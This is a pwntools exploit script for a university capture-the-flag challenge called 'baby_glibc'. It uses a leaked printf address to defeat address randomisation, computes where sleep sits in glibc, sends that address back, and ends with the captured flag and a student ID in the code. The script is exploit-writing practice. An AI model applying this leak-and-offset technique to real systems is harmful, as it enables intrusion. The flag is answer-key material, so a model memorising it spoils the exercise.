from pwn import *

# context.log_level = "DEBUG"

CHALLENGE = "baby_glibc"
URL = "offsec-chalbroker.osiris.cyber.nyu.edu"
PORT = 1235
NETID = b"xz4344"
LOCAL = False

if LOCAL:
    p = process(CHALLENGE)
else:
    p = remote(URL, PORT)
    p.recvuntil(b"NetID (something like abc123): ")
    p.sendline(NETID)

print(p.recvuntil(b": ").decode())
printf_addr = p.recv(8)
log.info(f"Receiving address in raw bytes: {printf_addr}")
print(p.recvuntil(b"> ").decode())
printf_addr = u64(printf_addr)
printf_offset = 0x606f0
sleep_offset = 0xea570
sleep_addr = printf_addr - printf_offset + sleep_offset
p.sendline(hex(sleep_addr).encode())
log.info(f"Sending address in base 16: {hex(sleep_addr)}")

p.interactive()

# flag{y0ur_g0nna_g3t_re4lly_fam1li4r_w1th_Gl1bC!_7a6eeaaaf4dae15e}
